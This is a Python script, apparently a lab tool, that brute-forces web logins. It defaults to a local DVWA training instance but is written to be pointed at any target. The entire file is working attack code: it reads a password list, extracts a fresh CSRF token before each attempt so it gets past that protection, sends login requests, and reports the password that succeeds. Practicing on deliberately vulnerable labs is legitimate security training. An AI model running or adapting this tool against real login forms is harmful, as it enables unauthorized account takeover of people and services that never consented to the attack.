# Ensure you have the required modules installed:
# pip install requests beautifulsoup4

import requests
from bs4 import BeautifulSoup

# Function to display colorful ASCII art
def display_ascii_art():
    ascii_art = r"""
       ___                              
      (  _`\                            
 ____ | (_(_)   _    _ __    ___    __  
(_  ,)|  _)   /'_`\ ( '__) /'___) /'__`\
 /'/_ | |    ( (_) )| |   ( (___ (  ___/
(____)(_)    `\___/'(_)   `\____)`\____)
                                        
by Parag Dhali
"""
    print(ascii_art)

# Display ASCII art
display_ascii_art()

# Target website and login path
TARGET_URL = "http://localhost/DVWA/vulnerabilities/brute/"  # Replace with the actual target
USERNAME = "admin"  # Change if needed
PASSWORD_FILE = "password_list.txt"  # Path to the password list
CSRF_TOKEN_FIELD_NAME = "user_token"  # Initialize CSRF token field name from the user
REQUEST_METHOD = "GET"  # Initialize request method from the user (GET or POST)
USERNAME_FIELD_NAME = "username"  # Initialize username field name from the user
PASSWORD_FIELD_NAME = "password"  # Initialize password field name from the user
EXTRA_FIELDS = {"Login": "Login"}  # Add extra fields as query string from the user
FAILURE_STRINGS = ["Username and/or password incorrect.", "Login failed"]  # List of strings to look for in the response to determine a failed login

# Start a session to maintain cookies
session = requests.Session()

# Initialize the first cookie from the user
initial_cookie = {"security": "high", "PHPSESSID": "8v029g60siqf401k1lmgqmb8pm"}  # Replace with the actual initial cookie value
session.cookies.update(initial_cookie)

def update_initial_cookie():
    """Fetch the initial cookie from the login page and update the session cookies."""
    response = session.get(TARGET_URL)
    new_cookie = response.cookies.get_dict()
    session.cookies.update(new_cookie)

# Update the initial cookie
update_initial_cookie()

def get_csrf_token():
    """Fetch the CSRF token from the login page."""
    response = session.get(TARGET_URL)
    soup = BeautifulSoup(response.text, "html.parser")
    
    # Find the CSRF token (modify if your site uses a different name)
    csrf_token_tag = soup.find("input", {"name": CSRF_TOKEN_FIELD_NAME})  # Use user-defined CSRF token name
    if csrf_token_tag:
        return csrf_token_tag["value"]
    return None

def attempt_login(username, password, csrf_token):
    """Attempt to log in with the given username, password, and CSRF token."""
    payload = {
        USERNAME_FIELD_NAME: username,  # Use user-defined username field name
        PASSWORD_FIELD_NAME: password,  # Use user-defined password field name
        "Login": "Login",  # Added login button name
        CSRF_TOKEN_FIELD_NAME: csrf_token  # Use user-defined CSRF token name
    }
    
    # Add extra fields to the payload
    payload.update(EXTRA_FIELDS)
    
    if REQUEST_METHOD.upper() == "POST":
        response = session.post(TARGET_URL, data=payload)
    else:
        response = session.get(TARGET_URL, params=payload)
    
    # Modify this condition based on the website's login failure messages
    if not any(failure_string in response.text for failure_string in FAILURE_STRINGS):  # Adjusted failure condition
        return True
    return False

# Read the password file and start brute force attack
with open(PASSWORD_FILE, "r") as file:
    for password in file:
        password = password.strip()
        
        csrf_token = get_csrf_token()
        if not csrf_token:
            print("❌ Error: Could not extract CSRF token.")
            break
        
        print(f"🔍 Trying password: {password}")

        if attempt_login(USERNAME, password, csrf_token):
            print(f"✅ Success! Password found: {password}")
            break
    else:
        print("❌ Brute-force finished. No password found.")
